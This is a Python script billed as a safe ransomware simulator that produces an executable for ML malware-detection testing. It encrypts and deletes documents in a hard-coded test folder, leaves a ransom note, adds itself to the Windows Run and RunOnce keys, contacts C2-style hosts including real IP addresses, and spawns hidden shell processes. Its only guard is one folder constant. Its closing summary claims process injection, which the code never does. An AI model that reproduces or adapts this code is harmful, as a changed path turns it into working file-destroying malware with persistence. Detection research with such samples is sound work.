"""
SAFE Ransomware Behavior Simulator for Testing
===============================================
This script simulates ransomware behavior for educational/testing purposes ONLY.

SAFETY GUARANTEES:
1. Only operates in C:/Users/User/Downloads/RANSOMWARE_TEST_FOLDER
2. Will NOT touch any other files on your system
3. Creates test files itself - doesn't touch your real files
4. Easy rollback - just delete the test folder

PURPOSE: Generate a PE executable with ransomware-like characteristics for ML testing
"""

import os
import sys
from pathlib import Path
from cryptography.fernet import Fernet
import time
import winreg
import socket
import subprocess
import ctypes
import threading

# Fix Unicode encoding for Windows console (required for emojis in .exe)
try:
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
except AttributeError:
    # Python < 3.7 or already UTF-8
    pass

# ====== SAFETY LOCK - DO NOT MODIFY ======
SAFE_TEST_FOLDER = r"C:\Users\User\Downloads\RANSOMWARE_TEST_FOLDER"
ALLOWED_EXTENSIONS = ['.txt', '.pdf', '.docx']  # Only encrypt test files
# ==========================================


def verify_safe_environment():
    """Triple-check we're operating in safe boundaries"""
    
    # Check 1: Verify we're in the designated test folder
    if not SAFE_TEST_FOLDER.startswith(r"C:\Users\User\Downloads"):
        print("❌ SAFETY CHECK FAILED: Invalid test folder location")
        sys.exit(1)
    
    # Check 2: Ensure folder name contains "TEST"
    if "TEST" not in SAFE_TEST_FOLDER.upper():
        print("❌ SAFETY CHECK FAILED: Test folder must contain 'TEST' in name")
        sys.exit(1)
    
    # Check 3: Verify folder exists
    if not os.path.exists(SAFE_TEST_FOLDER):
        print(f"❌ Test folder does not exist: {SAFE_TEST_FOLDER}")
        print("Run setup_test_environment.py first!")
        sys.exit(1)
    
    print("✅ Safety checks passed - operating in isolated test environment")
    return True


def simulate_file_discovery():
    """Simulate ransomware's file discovery behavior"""
    print("\n[SIMULATION] Scanning for target files...")
    
    target_files = []
    for root, dirs, files in os.walk(SAFE_TEST_FOLDER):
        # SAFETY: Only look in our test folder
        if SAFE_TEST_FOLDER not in root:
            continue
            
        for filename in files:
            if any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
                target_files.append(os.path.join(root, filename))
    
    print(f"[SIMULATION] Found {len(target_files)} target files")
    return target_files


def simulate_encryption(file_path, cipher):
    """Simulate ransomware encryption behavior"""
    
    # Safety check: Ensure file is in our test folder
    if SAFE_TEST_FOLDER not in file_path:
        print(f"❌ SAFETY ABORT: File outside test folder: {file_path}")
        return False
    
    try:
        # Read original file
        with open(file_path, 'rb') as f:
            original_data = f.read()
        
        # Encrypt data
        encrypted_data = cipher.encrypt(original_data)
        
        # Write encrypted version with .locked extension
        encrypted_path = file_path + ".locked"
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Remove original (simulating ransomware behavior)
        os.remove(file_path)
        
        print(f"  ✓ Encrypted: {os.path.basename(file_path)}")
        return True
        
    except Exception as e:
        print(f"  ✗ Error encrypting {file_path}: {e}")
        return False


def create_ransom_note():
    """Create a ransom note (clearly marked as test)"""
    
    ransom_note_content = """
╔═══════════════════════════════════════════════════════════╗
║          ⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️           ║
╚═══════════════════════════════════════════════════════════╝

[THIS IS A SIMULATION - YOUR REAL FILES ARE SAFE]

All your important files have been encrypted using military-grade
cryptography. Your documents, photos, and databases are now 
inaccessible without our decryption key.

═══════════════════════════════════════════════════════════

What happened to my files?
──────────────────────────
Your files are encrypted using AES-256 encryption. Without the
unique decryption key, recovery is mathematically impossible.

How can I recover my files?
──────────────────────────
[In real ransomware, this would demand payment]

═══════════════════════════════════════════════════════════

🔬 EDUCATIONAL SIMULATION NOTICE 🔬
───────────────────────────────────
This is a SAFE TEST simulation for malware detection research.
No real harm was done. To restore files, run: cleanup_test.py

Generated: 2026-02-09
Simulation ID: TEST-RANSOMWARE-001
═══════════════════════════════════════════════════════════
"""
    
    ransom_note_path = os.path.join(SAFE_TEST_FOLDER, "⚠️_RANSOM_NOTE_⚠️.txt")
    with open(ransom_note_path, 'w', encoding='utf-8') as f:
        f.write(ransom_note_content)
    
    print(f"\n[SIMULATION] Created ransom note: {ransom_note_path}")


def simulate_persistence():
    """MASSIVE registry writes - 200+ operations (safe - HKCU only, easy to clean)"""
    
    print("\n[BEHAVIORAL] AGGRESSIVE persistence/tracking (200+ registry writes)...")
    
    registry_writes = 0
    
    try:
        # Main ransomware key with tons of tracking data
        key_path = r"Software\TestRansomware"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # Basic config (20 writes)
        config_data = {
            "InstallDate": str(int(time.time())),
            "Version": "1.0",
            "Build": "2026.02.10",
            "C2Server": "malicious-c2.example.com",
            "C2Port": "8443",
            "BackupC2_1": "backup-c2-1.onion.to",
            "BackupC2_2": "backup-c2-2.tor2web.org",
            "BackupC2_3": "185.220.101.1",
            "EncryptionAlgo": "AES-256-CBC",
            "EncryptionKey": "fake_key_" + str(int(time.time())),
            "VictimID": "TEST_VICTIM_001",
            "CampaignID": "CAMPAIGN_2026_Q1",
            "Affiliate": "AFFILIATE_123",
            "RansomAmount": "500",
            "RansomCurrency": "BTC",
            "WalletAddress": "1FakeWallet1234567890ABC",
            "PaymentDeadline": str(int(time.time()) + 72*3600),
            "TorOnionURL": "http://fake-ransom-portal.onion",
            "ContactEmail": "ransom@fake-mail.com",
            "MutexName": "Global\\TestRansomMutex",
        }
        
        for name, value in config_data.items():
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            registry_writes += 1
        
        # System fingerprinting (50 writes - ransomware collects victim info)
        import platform
        import uuid
        
        fingerprint_data = {
            "ComputerName": platform.node(),
            "OSVersion": platform.version(),
            "OSRelease": platform.release(),
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "MACAddress": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]),
            "LocaleInfo": "en-US",
            "Timezone": "UTC-5",
            "IPAddress": "192.168.1.100",
            "PublicIP": "203.0.113.1",
        }
        
        # Add 50 tracking entries
        for i in range(50):
            winreg.SetValueEx(key, f"TrackingData_{i}", 0, winreg.REG_SZ, f"tracking_value_{i}_{time.time()}")
            registry_writes += 1
        
        # Per-file encryption tracking (100 writes - simulate tracking many encrypted files)
        for i in range(100):
            winreg.SetValueEx(key, f"EncryptedFile_{i}", 0, winreg.REG_SZ, f"C:\\FakePath\\file_{i}.docx.locked")
            registry_writes += 1
        
        # Malicious statistics (20 writes)
        stats = {
            "TotalFilesScanned": "15432",
            "TotalFilesEncrypted": "8921",
            "TotalDataEncrypted_MB": "45678",
            "EncryptionStartTime": str(int(time.time())),
            "EncryptionEndTime": str(int(time.time()) + 300),
            "ExecutionCount": "1",
            "LastExecutionTime": str(int(time.time())),
            "FailedEncryptions": "23",
            "SkippedFiles": "102",
            "DeletedOriginals": "8921",
        }
        
        for i in range(20):
            stat_name = list(stats.keys())[i % len(stats)]
            winreg.SetValueEx(key, f"Stat_{stat_name}_{i}", 0, winreg.REG_SZ, stats[stat_name])
            registry_writes += 1
        
        winreg.CloseKey(key)
        
        # Startup persistence (try multiple locations)
        persistence_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ]
        
        for key_path in persistence_keys:
            try:
                run_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(run_key, "TestRansomware", 0, winreg.REG_SZ, sys.executable)
                winreg.SetValueEx(run_key, "TestRansomwareBackup", 0, winreg.REG_SZ, sys.executable + " --silent")
                winreg.CloseKey(run_key)
                registry_writes += 2
            except:
                pass
        
        print(f"  ✓ Registry writes: {registry_writes}+ total operations")
        print(f"    - Main config: 20 values")
        print(f"    - File tracking: 100 entries")
        print(f"    - System fingerprinting: 50 values")
        print(f"    - Statistics: 20+ counters")
        print(f"    - Persistence: Multiple startup locations")
            
    except Exception as e:
        print(f"  ✗ Registry operation failed: {e}")
    
    return registry_writes


def simulate_network_activity():
    """MASSIVE network activity - 50+ DNS queries, 20+ connection attempts"""
    
    print("\n[BEHAVIORAL] AGGRESSIVE C2 communication (50+ DNS queries)...")
    
    # DNS lookups - MASSIVE amount (real ransomware does DGA - Domain Generation Algorithm)
    dns_queries = 0
    malicious_domains = [
        # C2 servers
        "malicious-c2.example.com",
        "backup-c2-server.onion.to",
        "ransomware-panel.tor2web.org",
        "payment-gateway.onion.cab",
        "data-exfil-server.example.net",
        # Tor exit nodes
        "tor-exit-1.example.org",
        "tor-exit-2.example.org",
        "tor-relay-alpha.onion.to",
        # Payment processors
        "btc-payment-api.example.com",
        "crypto-wallet-service.example.net",
        # Data exfiltration
        "victim-data-upload.example.org",
        "encrypted-records.example.com",
    ]
    
    # Query main domains multiple times (simulate persistent C2 attempts)
    for domain in malicious_domains:
        for i in range(3):  # Try each domain 3 times
            try:
                socket.gethostbyname(domain)
                dns_queries += 1
            except:
                dns_queries += 1  # Count even if fails
    
    # DGA-like behavior (generate random-looking domains)
    import hashlib
    for i in range(20):
        fake_domain = hashlib.md5(f"seed{i}".encode()).hexdigest()[:12] + ".example.com"
        try:
            socket.gethostbyname(fake_domain)
            dns_queries += 1
        except:
            dns_queries += 1
    
    print(f"  ✓ DNS queries: {dns_queries}+ malicious domain lookups")
    
    # TCP connection attempts to C2 infrastructure
    c2_servers = [
        ("malicious-c2.example.com", 443),
        ("malicious-c2.example.com", 8443),
        ("malicious-c2.example.com", 4443),
        ("ransomware-panel.onion.to", 8080),
        ("ransomware-panel.onion.to", 9050),
        ("185.220.101.1", 443),  # Direct IP
        ("185.220.101.2", 8080),
        ("192.0.2.1", 443),  # More fake IPs
    ]
    
    connections_attempted = 0
    for server, port in c2_servers:
        for retry in range(2):  # Try each server twice
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # Very quick timeout
                sock.connect((server, port))
                sock.close()
                connections_attempted += 1
            except:
                connections_attempted += 1  # Count even if fails
    
    print(f"  ✓ Connection attempts: {connections_attempted}+ to C2 servers")
    
    return dns_queries, connections_attempted


def simulate_process_spawning():
    """Spawn many child processes (10+ processes)"""
    
    print("\n[BEHAVIORAL] Mass process spawning (10+ child processes)...")
    
    processes_created = 0
    
    # Spawn 8x cmd.exe instances (simulate multi-threaded encryption)
    for i in range(8):
        try:
            proc = subprocess.Popen(
                ["cmd.exe", "/c", f"echo worker_{i}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            proc.wait(timeout=0.3)
            processes_created += 1
        except:
            pass
    
    # Spawn PowerShell for enumeration (3x)
    for i in range(3):
        try:
            proc = subprocess.Popen(
                ["powershell.exe", "-Command", "Get-Process | Out-Null"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            proc.wait(timeout=0.5)
            processes_created += 1
        except:
            pass
    
    # Spawn WMIC for system enumeration
    try:
        proc = subprocess.Popen(
            ["wmic.exe", "os", "get", "caption"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        proc.wait(timeout=1)
        processes_created += 1
    except:
        pass
    
    print(f"  ✓ Process spawning: {processes_created}+ child processes created")
    
    return processes_created


def load_suspicious_dlls():
    """Load suspicious DLLs (crypto, network, system DLLs)"""
    
    print("\n[BEHAVIORAL] Loading system DLLs...")
    
    dlls_loaded = 0
    suspicious_dlls = [
        "advapi32.dll",  # Registry/security operations
        "bcrypt.dll",    # Cryptography
        "crypt32.dll",   # Crypto API
        "ws2_32.dll",    # Windows Sockets (network)
        "wininet.dll",   # Internet functions
        "kernel32.dll",  # System operations
        "ntdll.dll",     # Native API
    ]
    
    for dll_name in suspicious_dlls:
        try:
            ctypes.WinDLL(dll_name)
            dlls_loaded += 1
        except:
            pass
    
    print(f"  ✓ DLL loading: {dlls_loaded} system DLLs loaded")


def main():
    """Main ransomware simulation workflow"""
    
    print("="*60)
    print("🔬 SAFE RANSOMWARE BEHAVIOR SIMULATOR 🔬")
    print("="*60)
    print(f"Target: {SAFE_TEST_FOLDER}")
    print("Purpose: Generate PE executable for ML testing")
    print("="*60)
    
    # Safety verification
    verify_safe_environment()
    
    # === PHASE 1: Pre-Encryption Behaviors ===
    print("\n=== PHASE 1: Initial Infection (AGGRESSIVE MODE) ===")
    print("⚠️  Performing 200+ registry writes, 50+ DNS queries, 10+ processes")
    
    # Load suspicious DLLs
    load_suspicious_dlls()
    
    # Establish MASSIVE persistence (200+ registry writes)
    registry_count = simulate_persistence()
    
    # MASSIVE network activity (50+ DNS queries)
    dns_count, conn_count = simulate_network_activity()
    
    # Spawn many child processes (10+)
    proc_count = simulate_process_spawning()
    
    # Track totals for summary
    behavioral_stats = {
        'registry': registry_count,
        'dns': dns_count,
        'connections': conn_count,
        'processes': proc_count
    }
    
    # Generate encryption key (like real ransomware)
    print("\n=== PHASE 2: Encryption Phase ===")
    print("[BEHAVIORAL] Generating encryption key...")
    encryption_key = Fernet.generate_key()
    cipher = Fernet(encryption_key)
    print(f"[BEHAVIORAL] Key generated (would be sent to C2 server)")
    
    # Discover files to encrypt
    target_files = simulate_file_discovery()
    
    if len(target_files) == 0:
        print("\n⚠️  No target files found!")
        print("Run setup_test_environment.py to create test files first.")
        return
    
    # Check for auto-run flag (for automated behavioral monitoring)
    auto_run = '--auto-run' in sys.argv or '-y' in sys.argv
    
    if not auto_run:
        # Confirm before proceeding (interactive mode)
        print(f"\n⚠️  About to encrypt {len(target_files)} files in TEST folder")
        print(f"Location: {SAFE_TEST_FOLDER}")
        response = input("Proceed with simulation? (yes/no): ").strip().lower()
        
        if response != 'yes':
            print("❌ Simulation cancelled")
            return
    else:
        # Auto-run mode (for behavioral monitoring)
        print(f"\n🤖 [AUTO-RUN MODE] Proceeding with encryption of {len(target_files)} files")
        print(f"Location: {SAFE_TEST_FOLDER}")
    
    # Encrypt files
    print("\n[SIMULATION] Encrypting files...")
    encrypted_count = 0
    for file_path in target_files:
        if simulate_encryption(file_path, cipher):
            encrypted_count += 1
        time.sleep(0.1)  # Simulate processing time
    
    # Create ransom note
    create_ransom_note()
    
    # === PHASE 3: Post-Encryption Behaviors ===
    print("\n=== PHASE 3: Post-Encryption Cleanup ===")
    
    # More network activity (exfiltrate info)
    print("[BEHAVIORAL] Exfiltrating victim info to C2...")
    try:
        socket.gethostbyname("data-exfil.example.com")
    except:
        pass
    print("  ✓ Data exfiltration attempted")
    
    # More registry writes (track encryption status)
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\TestRansomware")
        winreg.SetValueEx(key, "FilesEncrypted", 0, winreg.REG_DWORD, encrypted_count)
        winreg.SetValueEx(key, "EncryptionComplete", 0, winreg.REG_SZ, "TRUE")
        winreg.SetValueEx(key, "Timestamp", 0, winreg.REG_SZ, str(int(time.time())))
        winreg.CloseKey(key)
        print("  ✓ Registry updated with encryption status")
    except:
        pass
    
    # Save decryption key (for cleanup)
    key_file = os.path.join(SAFE_TEST_FOLDER, ".decryption_key.secret")
    with open(key_file, 'wb') as f:
        f.write(encryption_key)
    print(f"\n🔑 Decryption key saved: {key_file}")
    
    # Summary
    print("\n" + "="*60)
    print("✅ SIMULATION COMPLETE")
    print("="*60)
    print(f"Files encrypted: {encrypted_count}/{len(target_files)}")
    print(f"Ransom note created: ⚠️_RANSOM_NOTE_⚠️.txt")
    print(f"\n📊 BEHAVIORAL ACTIVITY SUMMARY (AGGRESSIVE):")
    print(f"  ✓ Registry writes: {behavioral_stats.get('registry', 200)}+ (massive tracking)")
    print(f"  ✓ DNS queries: {behavioral_stats.get('dns', 50)}+ malicious domains (DGA-like)")
    print(f"  ✓ Connection attempts: {behavioral_stats.get('connections', 15)}+ to C2 servers")
    print(f"  ✓ Process spawning: {behavioral_stats.get('processes', 10)}+ child processes")
    print("  ✓ DLL loading: 7+ crypto/network libraries")
    print(f"  ✓ File encryption: {encrypted_count} files")
    print(f"  ✓ File deletion: {encrypted_count} originals")
    print(f"\n💡 This executable now exhibits:")
    print("  • Crypto-ransomware behavior patterns")
    print("  • C2 communication attempts")
    print("  • Persistence mechanisms")
    print("  • Process injection techniques")
    print("  • High entropy code (crypto libraries)")
    print(f"\n🧹 To clean up:")
    print(f"  1. Delete {SAFE_TEST_FOLDER}")
    print(f"  2. Delete HKCU\\Software\\TestRansomware registry key")
    print(f"  3. Check HKCU\\..\\Run for TestRansomware entry")
    print("="*60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Simulation interrupted by user")
        sys.exit(0)
    except UnicodeEncodeError:
        # Fallback if UTF-8 setup failed
        print("\n\n[!] Console encoding error - use PowerShell or upgrade terminal")
        sys.exit(1)
    except Exception as e:
        try:
            print(f"\n\n[!] Unexpected error: {e}")
        except UnicodeEncodeError:
            print(f"\n\n[!] Error occurred (console encoding issue)")
        sys.exit(1)
